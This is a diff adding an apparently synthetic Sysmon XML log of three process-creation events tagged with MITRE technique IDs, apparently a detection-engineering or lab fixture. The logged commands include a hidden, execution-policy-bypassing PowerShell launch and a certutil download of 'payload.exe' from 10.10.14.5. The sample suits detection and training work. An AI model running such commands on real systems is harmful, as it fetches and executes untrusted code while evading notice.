@@ -1,0 +1,132 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Events>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2024-12-01T16:10:02.1230000Z" />
+      <EventRecordID>4950</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="4028" ThreadID="5104" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>win11v.condef.local</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">technique_id=T1059,technique_name=Command and Scripting Interpreter</Data>
+      <Data Name="UtcTime">2024-12-01 16:10:02.100</Data>
+      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0001-000000000c00}</Data>
+      <Data Name="ProcessId">6124</Data>
+      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">Windows Command Processor</Data>
+      <Data Name="Product">Microsoft® Windows® Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">Cmd.Exe</Data>
+      <Data Name="CommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
+      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
+      <Data Name="User">CONDEF\Administrator</Data>
+      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
+      <Data Name="LogonId">0x16ad6e</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA1=886F6844AA88379820D9DECA1BF32595CB2871AD,MD5=C9D8329F09371EF97C3013EF7C8B8523,SHA256=8A2A5B5E1BA5570F8C6F4A3C7B0F9E7D2C1B4A6E3D0F9C8B7A6E5D4C3B2A1908,IMPHASH=A6C8B4D2E1F09C8B7A6E5D4C3B2A1908</Data>
+      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-7201-000000000c00}</Data>
+      <Data Name="ParentProcessId">3312</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
+      <Data Name="ParentUser">CONDEF\Administrator</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2024-12-01T16:10:15.4560000Z" />
+      <EventRecordID>4951</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="4028" ThreadID="5104" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>win11v.condef.local</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
+      <Data Name="UtcTime">2024-12-01 16:10:15.420</Data>
+      <Data Name="ProcessGuid">{f3565dc0-8a27-674c-0002-000000000c00}</Data>
+      <Data Name="ProcessId">7740</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">Windows PowerShell</Data>
+      <Data Name="Product">Microsoft® Windows® Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">PowerShell.EXE</Data>
+      <Data Name="CommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
+      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
+      <Data Name="User">CONDEF\Administrator</Data>
+      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
+      <Data Name="LogonId">0x16ad6e</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA1=6DA6B0975F8F4B4BBC9D7CE6E2FC8B0E9D5A1C3F,MD5=1A2B3C4D5E6F7089A1B2C3D4E5F60718,SHA256=1C2B3A4958677869504132A1B2C3D4E5F6071829304152637485960A1B2C3D,IMPHASH=B2C3D4E5F60718293041526374859601</Data>
+      <Data Name="ParentProcessGuid">{f3565dc0-8a1a-674c-0001-000000000c00}</Data>
+      <Data Name="ParentProcessId">6124</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
+      <Data Name="ParentUser">CONDEF\Administrator</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2024-12-01T16:10:33.7890000Z" />
+      <EventRecordID>4952</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="4028" ThreadID="5104" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>win11v.condef.local</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">technique_id=T1105,technique_name=Ingress Tool Transfer</Data>
+      <Data Name="UtcTime">2024-12-01 16:10:33.760</Data>
+      <Data Name="ProcessGuid">{f3565dc0-8a39-674c-0003-000000000c00}</Data>
+      <Data Name="ProcessId">8812</Data>
+      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">CertUtil.exe</Data>
+      <Data Name="Product">Microsoft® Windows® Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">CertUtil.exe</Data>
+      <Data Name="CommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
+      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
+      <Data Name="User">CONDEF\Administrator</Data>
+      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
+      <Data Name="LogonId">0x16ad6e</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA1=2F4E6D8C0A2B4E6D8F0A2C4E6D8F0A2C4E6D8F0A,MD5=3D4E5F60718293A4B5C6D7E8F9081726,SHA256=2B3C4D5E6F708192A3B4C5D6E7F8091A2B3C4D5E6F708192A3B4C5D6E7F8091,IMPHASH=C3D4E5F60718293A4B5C6D7E8F908172</Data>
+      <Data Name="ParentProcessGuid">{f3565dc0-8a27-674c-0002-000000000c00}</Data>
+      <Data Name="ParentProcessId">7740</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
+      <Data Name="ParentUser">CONDEF\Administrator</Data>
+    </EventData>
+  </Event>
+</Events>
